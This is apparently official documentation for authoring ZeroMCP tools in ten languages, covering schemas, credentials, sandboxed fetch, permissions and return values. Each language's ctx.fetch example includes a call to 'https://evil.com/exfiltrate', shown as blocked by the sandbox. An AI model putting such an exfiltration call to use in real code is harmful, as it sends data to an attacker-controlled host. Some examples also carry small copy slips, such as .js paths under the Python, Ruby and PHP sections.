# Tool Authoring Guide

Everything you need to write ZeroMCP tools. Schema reference, permissions, the ctx object, and best practices.

## Basic structure

**Node.js**

A ZeroMCP tool is a file with a default export:

**Python**

A ZeroMCP tool is a file with a default export:

**Ruby**

A ZeroMCP tool is a file with a default export:

**PHP**

A ZeroMCP tool is a file with a default export:

**Go**

Register tools in your main function:

**Rust**

Register tools in your main function:

**Kotlin**

Register tools in your main function:

**Java**

Register tools in your main function:

**C#**

Register tools in your main function:

**Swift**

Register tools in your main function:

**Node.js**

```
export default {
  description: "What this tool does",
  input: { /* schema */ },
  permissions: { /* optional */ },
  execute: async (args, ctx) => { /* logic */ },
}
```

**Python**

```
tool = {
    "description": "What this tool does",
    "input": { # schema },
    "permissions": { # optional },
}

async def execute(args, ctx):
    # logic
    pass
```

**Go**

```
s.Tool("my_tool", zeromcp.Tool{
    Description: "What this tool does",
    Input:       zeromcp.Input{ /* schema */ },
    Permissions: zeromcp.Permissions{ /* optional */ },
    Execute: func(args map[string]any, ctx *zeromcp.Ctx) (any, error) {
        // logic
        return nil, nil
    },
})
```

**Rust**

```
server.tool("my_tool", Tool {
    description: "What this tool does".to_string(),
    input: Input::new(),
    permissions: Permissions::default(),
    execute: Box::new(|args: Value, ctx: Ctx| {
        Box::pin(async move {
            // logic
            Ok(Value::Null)
        })
    }),
});
```

**Kotlin**

```
server.tool("my_tool") {
    description = "What this tool does"
    input { /* schema */ }
    permissions { /* optional */ }
    execute { args, ctx ->
        // logic
    }
}
```

**Java**

```
server.tool("my_tool", Tool.builder()
    .description("What this tool does")
    .input(/* schema */)
    .permissions(/* optional */)
    .execute((args, ctx) -> {
        // logic
        return null;
    })
    .build());
```

**C#**

```
server.Tool("my_tool", new ToolDefinition {
    Description = "What this tool does",
    Input = new Dictionary<string, InputField> {
        /* schema */
    },
    Permissions = new Permissions { /* optional */ },
    Execute = async (args, ctx) => {
        // logic
        return null;
    }
});
```

**Swift**

```
server.tool("my_tool",
    description: "What this tool does",
    input: [ /* schema */ ],
    permissions: Permissions()
) { args, ctx in
    // logic
}
```

**Ruby**

```
tool description: "What this tool does",
     input: {
       # schema
     },
     permissions: {
       # optional
     }

execute do |args, ctx|
  # logic
end
```

**PHP**

```
<?php
return [
    'description' => 'What this tool does',
    'input' => [ /* schema */ ],
    'permissions' => [ /* optional */ ],
    'execute' => function ($args, $ctx) {
        // logic
    },
];
```

## Input schema

ZeroMCP uses a simplified schema format that auto-converts to JSON Schema:

**Node.js**

```
// Simple — just a type string
input: {
  name: "string",
  count: "number",
  active: "boolean",
}

// Detailed — with description, optional flag
input: {
  name: "string",
  limit: {
    type: "number",
    description: "Maximum results to return",
    optional: true,
  },
}
```

**Python**

```
# Simple — just a type string
"input": {
    "name": "string",
    "count": "number",
    "active": "boolean",
}

# Detailed — with description, optional flag
"input": {
    "name": "string",
    "limit": {
        "type": "number",
        "description": "Maximum results to return",
        "optional": True,
    },
}
```

**Go**

```
// Simple — just a type string
Input: zeromcp.Input{
    "name":   "string",
    "count":  "number",
    "active": "boolean",
}

// Detailed — with description, optional flag
Input: zeromcp.Input{
    "name": "string",
    "limit": zeromcp.Field{
        Type:        "number",
        Description: "Maximum results to return",
        Optional:    true,
    },
}
```

**Rust**

```
// Simple — required fields
input: Input::new()
    .required("name", "string")
    .required("count", "number")
    .required("active", "boolean"),

// Detailed — with description, optional flag
input: Input::new()
    .required("name", "string")
    .optional_desc("limit", "number", "Maximum results to return"),
```

**Kotlin**

```
// Simple — just a type string
input {
    "name" to "string"
    "count" to "number"
    "active" to "boolean"
}

// Detailed — with description, optional flag
input {
    "name" to "string"
    "limit" to field {
        type = "number"
        description = "Maximum results to return"
        optional = true
    }
}
```

**Java**

```
// Simple — required fields
.input(
    Input.required("name", "string"),
    Input.required("count", "number"),
    Input.required("active", "boolean")
)

// Detailed — with description, optional flag
.input(
    Input.required("name", "string", "The person's name"),
    Input.optional("limit", "number", "Maximum results to return")
)
```

**C#**

```
// Simple — just a type
Input = new Dictionary<string, InputField> {
    ["name"] = new InputField(SimpleType.String),
    ["count"] = new InputField(SimpleType.Number),
    ["active"] = new InputField(SimpleType.Boolean),
}

// Detailed — with description, optional flag
Input = new Dictionary<string, InputField> {
    ["name"] = new InputField(SimpleType.String),
    ["limit"] = new InputField(SimpleType.Number) {
        Description = "Maximum results to return",
        Optional = true
    }
}
```

**Swift**

```
// Simple — just a type
input: [
    "name": .simple(.string),
    "count": .simple(.number),
    "active": .simple(.boolean)
]

// Detailed — with description, optional flag
input: [
    "name": .simple(.string),
    "limit": .field(
        type: .number,
        optional: true,
        description: "Maximum results to return"
    )
]
```

**Ruby**

```
# Simple — just a type string
input: {
  name: "string",
  count: "number",
  active: "boolean"
}

# Detailed — with description, optional flag
input: {
  name: "string",
  limit: {
    type: "number",
    description: "Maximum results to return",
    optional: true
  }
}
```

**PHP**

```
// Simple — just a type string
'input' => [
    'name' => 'string',
    'count' => 'number',
    'active' => 'boolean',
],

// Detailed — with description, optional flag
'input' => [
    'name' => 'string',
    'limit' => [
        'type' => 'number',
        'description' => 'Maximum results to return',
        'optional' => true,
    ],
],
```

| Type | JSON Schema |
| --- | --- |
| `"string"` | `{ "type": "string" }` |
| `"number"` | `{ "type": "number" }` |
| `"boolean"` | `{ "type": "boolean" }` |
| `{ type, description, optional }` | Full JSON Schema property with description, removed from `required` if optional |

## The ctx object

Every tool's `execute` function receives a context object as the second argument:

### ctx.credentials

Credentials mapped from your config. Tools never touch raw env vars.

**Node.js**

```
// zeromcp.config.json
{
  "credentials": {
    "stripe": {
      "env": "STRIPE_KEY"
    }
  }
}

// In your tool
execute: async (args, ctx) => {
  ctx.credentials.apiKey  // value of STRIPE_KEY
}
```

**Python**

```
# zeromcp.config.json
{
  "credentials": {
    "stripe": {
      "env": "STRIPE_KEY"
    }
  }
}

# In your tool
async def execute(args, ctx):
    ctx.credentials["apiKey"]  # value of STRIPE_KEY
```

**Go**

```
// zeromcp.config.json
{
  "credentials": {
    "stripe": {
      "env": "STRIPE_KEY"
    }
  }
}

// In your tool
Execute: func(args map[string]any, ctx *zeromcp.Ctx) (any, error) {
    key := ctx.Credentials["apiKey"]  // value of STRIPE_KEY
    return nil, nil
}
```

**Rust**

```
// zeromcp.config.json
{
  "credentials": {
    "stripe": {
      "env": "STRIPE_KEY"
    }
  }
}

// In your tool
execute: Box::new(|args: Value, ctx: Ctx| {
    Box::pin(async move {
        let key = &ctx.credentials["apiKey"]; // value of STRIPE_KEY
        Ok(Value::Null)
    })
})
```

**Kotlin**

```
// zeromcp.config.json
{
  "credentials": {
    "stripe": {
      "env": "STRIPE_KEY"
    }
  }
}

// In your tool
execute { args, ctx ->
    ctx.credentials["apiKey"]  // value of STRIPE_KEY
}
```

**Java**

```
// zeromcp.config.json
{
  "credentials": {
    "stripe": {
      "env": "STRIPE_KEY"
    }
  }
}

// In your tool
.execute((args, ctx) -> {
    var key = ctx.credentials().get("apiKey"); // value of STRIPE_KEY
    return null;
})
```

**C#**

```
// zeromcp.config.json
{
  "credentials": {
    "stripe": {
      "env": "STRIPE_KEY"
    }
  }
}

// In your tool
Execute = async (args, ctx) => {
    var key = ctx.Credentials["apiKey"]; // value of STRIPE_KEY
    return null;
}
```

**Swift**

```
// zeromcp.config.json
{
  "credentials": {
    "stripe": {
      "env": "STRIPE_KEY"
    }
  }
}

// In your tool
{ args, ctx in
    let key = ctx.credentials["apiKey"]! // value of STRIPE_KEY
}
```

**Ruby**

```
# zeromcp.config.json
{
  "credentials": {
    "stripe": {
      "env": "STRIPE_KEY"
    }
  }
}

# In your tool
execute do |args, ctx|
  ctx.credentials["apiKey"]  # value of STRIPE_KEY
end
```

**PHP**

```
// zeromcp.config.json
{
  "credentials": {
    "stripe": {
      "env": "STRIPE_KEY"
    }
  }
}

// In your tool
'execute' => function ($args, $ctx) {
    $key = $ctx->credentials['apiKey']; // value of STRIPE_KEY
}
```

### ctx.fetch

Sandboxed fetch that only reaches domains declared in `permissions.network`. All calls are logged when `logging: true`.

**Node.js**

```
permissions: {
  network: ["api.stripe.com"]
},

execute: async (args, ctx) => {
  // This works — domain is declared
  const res = await ctx.fetch("https://api.stripe.com/v1/customers");

  // This is BLOCKED — domain not declared
  const res2 = await ctx.fetch("https://evil.com/exfiltrate");
}
```

**Python**

```
"permissions": {
    "network": ["api.stripe.com"]
},

async def execute(args, ctx):
    # This works — domain is declared
    res = await ctx.fetch("https://api.stripe.com/v1/customers")

    # This is BLOCKED — domain not declared
    res2 = await ctx.fetch("https://evil.com/exfiltrate")
```

**Go**

```
Permissions: zeromcp.Permissions{
    Network: []string{"api.stripe.com"},
},

Execute: func(args map[string]any, ctx *zeromcp.Ctx) (any, error) {
    // This works — domain is declared
    res, _ := ctx.Fetch("https://api.stripe.com/v1/customers", zeromcp.FetchOpts{})

    // This is BLOCKED — domain not declared
    res2, _ := ctx.Fetch("https://evil.com/exfiltrate", zeromcp.FetchOpts{})
}
```

**Rust**

```
permissions: Permissions {
    network: vec!["api.stripe.com".to_string()],
    ..Default::default()
},

execute: Box::new(|args: Value, ctx: Ctx| {
    Box::pin(async move {
        // This works — domain is declared
        let res = ctx.fetch("https://api.stripe.com/v1/customers", FetchOpts::default()).await?;

        // This is BLOCKED — domain not declared
        let res2 = ctx.fetch("https://evil.com/exfiltrate", FetchOpts::default()).await?;
        Ok(Value::Null)
    })
})
```

**Kotlin**

```
permissions {
    network("api.stripe.com")
}

execute { args, ctx ->
    // This works — domain is declared
    val res = ctx.fetch("https://api.stripe.com/v1/customers")

    // This is BLOCKED — domain not declared
    val res2 = ctx.fetch("https://evil.com/exfiltrate")
}
```

**Java**

```
.permissions(Permissions.builder()
    .network("api.stripe.com")
    .build())

.execute((args, ctx) -> {
    // This works — domain is declared
    var res = ctx.fetch("https://api.stripe.com/v1/customers", FetchOpts.builder().build());

    // This is BLOCKED — domain not declared
    var res2 = ctx.fetch("https://evil.com/exfiltrate", FetchOpts.builder().build());
    return null;
})
```

**C#**

```
Permissions = new Permissions {
    Network = new[] { "api.stripe.com" }
},

Execute = async (args, ctx) => {
    // This works — domain is declared
    var res = await ctx.Fetch("https://api.stripe.com/v1/customers", new FetchOptions());

    // This is BLOCKED — domain not declared
    var res2 = await ctx.Fetch("https://evil.com/exfiltrate", new FetchOptions());
    return null;
}
```

**Swift**

```
permissions: Permissions(
    network: ["api.stripe.com"]
)

// In execute:
{ args, ctx in
    // This works — domain is declared
    let res = try await ctx.fetch("https://api.stripe.com/v1/customers")

    // This is BLOCKED — domain not declared
    let res2 = try await ctx.fetch("https://evil.com/exfiltrate")
}
```

**Ruby**

```
permissions: {
  network: ["api.stripe.com"]
}

execute do |args, ctx|
  # This works — domain is declared
  res = ctx.fetch("https://api.stripe.com/v1/customers")

  # This is BLOCKED — domain not declared
  res2 = ctx.fetch("https://evil.com/exfiltrate")
end
```

**PHP**

```
'permissions' => [
    'network' => ['api.stripe.com']
],

'execute' => function ($args, $ctx) {
    // This works — domain is declared
    $res = $ctx->fetch("https://api.stripe.com/v1/customers");

    // This is BLOCKED — domain not declared
    $res2 = $ctx->fetch("https://evil.com/exfiltrate");
}
```

## Permissions

Tools declare what they need upfront. The runtime enforces it.

**Node.js**

```
permissions: {
  network: ["api.stripe.com", "api.github.com"],  // allowed domains
  fs: ["./data"],                                    // filesystem paths
  exec: ["git"],                                     // executables
}
```

**Python**

```
"permissions": {
    "network": ["api.stripe.com", "api.github.com"],  # allowed domains
    "fs": ["./data"],                                    # filesystem paths
    "exec": ["git"],                                     # executables
}
```

**Go**

```
Permissions: zeromcp.Permissions{
    Network: []string{"api.stripe.com", "api.github.com"}, // allowed domains
    Fs:      []string{"./data"},                              // filesystem paths
    Exec:    []string{"git"},                                 // executables
}
```

**Rust**

```
permissions: Permissions {
    network: vec![
        "api.stripe.com".to_string(),
        "api.github.com".to_string(),
    ],                                          // allowed domains
    fs: vec!["./data".to_string()],             // filesystem paths
    exec: vec!["git".to_string()],              // executables
}
```

**Kotlin**

```
permissions {
    network("api.stripe.com", "api.github.com")  // allowed domains
    fs("./data")                                   // filesystem paths
    exec("git")                                    // executables
}
```

**Java**

```
.permissions(Permissions.builder()
    .network("api.stripe.com", "api.github.com")  // allowed domains
    .fs("./data")                                    // filesystem paths
    .exec("git")                                     // executables
    .build())
```

**C#**

```
Permissions = new Permissions {
    Network = new[] { "api.stripe.com", "api.github.com" }, // allowed domains
    Fs = new[] { "./data" },                                   // filesystem paths
    Exec = new[] { "git" }                                     // executables
}
```

**Swift**

```
permissions: Permissions(
    network: ["api.stripe.com", "api.github.com"], // allowed domains
    fs: ["./data"],                                   // filesystem paths
    exec: ["git"]                                     // executables
)
```

**Ruby**

```
permissions: {
  network: ["api.stripe.com", "api.github.com"],  # allowed domains
  fs: ["./data"],                                    # filesystem paths
  exec: ["git"]                                      # executables
}
```

**PHP**

```
'permissions' => [
    'network' => ['api.stripe.com', 'api.github.com'], // allowed domains
    'fs' => ['./data'],                                   // filesystem paths
    'exec' => ['git'],                                    // executables
],
```

Undeclared access is blocked by default. In development, set `"bypass_permissions": true` in your config to get warnings instead of blocks.

## Return values

Return a string or an object. Objects are JSON-stringified automatically.

**Node.js**

```
// String
execute: async () => "Done!"

// Object — auto-stringified to JSON
execute: async () => ({ customers: [...], count: 42 })
```

**Python**

```
# String
async def execute(args, ctx):
    return "Done!"

# Dict — auto-stringified to JSON
async def execute(args, ctx):
    return {"customers": [...], "count": 42}
```

**Go**

```
// String
Execute: func(args map[string]any, ctx *zeromcp.Ctx) (any, error) {
    return "Done!", nil
}

// Map — auto-stringified to JSON
Execute: func(args map[string]any, ctx *zeromcp.Ctx) (any, error) {
    return map[string]any{"customers": data, "count": 42}, nil
}
```

**Rust**

```
// String
Ok(Value::String("Done!".to_string()))

// Object — auto-stringified to JSON
Ok(serde_json::json!({ "customers": data, "count": 42 }))
```

**Kotlin**

```
// String
execute { args, ctx ->
    "Done!"
}

// Map — auto-stringified to JSON
execute { args, ctx ->
    mapOf("customers" to data, "count" to 42)
}
```

**Java**

```
// String
.execute((args, ctx) -> "Done!")

// Map — auto-stringified to JSON
.execute((args, ctx) -> Map.of("customers", data, "count", 42))
```

**C#**

```
// String
Execute = async (args, ctx) => "Done!"

// Object — auto-stringified to JSON
Execute = async (args, ctx) => new { customers = data, count = 42 }
```

**Swift**

```
// String
{ args, ctx in
    "Done!"
}

// Dictionary — auto-stringified to JSON
{ args, ctx in
    ["customers": data, "count": 42]
}
```

**Ruby**

```
# String
execute do |args, ctx|
  "Done!"
end

# Hash — auto-stringified to JSON
execute do |args, ctx|
  { customers: data, count: 42 }
end
```

**PHP**

```
// String
'execute' => function ($args, $ctx) {
    return "Done!";
}

// Array — auto-stringified to JSON
'execute' => function ($args, $ctx) {
    return ['customers' => $data, 'count' => 42];
}
```

## File naming

**Node.js**

The filename becomes the tool name. Only tool files are scanned:

```
tools/hello.js         → hello
tools/stripe/list.js   → stripe_list
tools/github/issues.js → github_issues
```

The separator defaults to `_` but can be changed in config with `"separator"`.

**Python**

The filename becomes the tool name. Only tool files are scanned:

```
tools/hello.js         → hello
tools/stripe/list.js   → stripe_list
tools/github/issues.js → github_issues
```

The separator defaults to `_` but can be changed in config with `"separator"`.

**Ruby**

The filename becomes the tool name. Only tool files are scanned:

```
tools/hello.js         → hello
tools/stripe/list.js   → stripe_list
tools/github/issues.js → github_issues
```

The separator defaults to `_` but can be changed in config with `"separator"`.

**PHP**

The filename becomes the tool name. Only tool files are scanned:

```
tools/hello.js         → hello
tools/stripe/list.js   → stripe_list
tools/github/issues.js → github_issues
```

The separator defaults to `_` but can be changed in config with `"separator"`.

**Go**

Tool names are set at registration time. The first argument to the tool registration call is the tool name. No file-naming conventions apply.

**Rust**

Tool names are set at registration time. The first argument to the tool registration call is the tool name. No file-naming conventions apply.

**Kotlin**

Tool names are set at registration time. The first argument to the tool registration call is the tool name. No file-naming conventions apply.

**Java**

Tool names are set at registration time. The first argument to the tool registration call is the tool name. No file-naming conventions apply.

**C#**

Tool names are set at registration time. The first argument to the tool registration call is the tool name. No file-naming conventions apply.

**Swift**

Tool names are set at registration time. The first argument to the tool registration call is the tool name. No file-naming conventions apply.

## Best practices

-   Keep tools small. One tool, one action.
-   Always declare permissions, even in development.
-   Use the sandboxed fetch from the context object instead of your language's default HTTP client. It respects the sandbox.
-   Use context credentials instead of reading environment variables directly. It keeps secrets out of tool code.
-   Add descriptions to input fields. MCP clients show these to users.
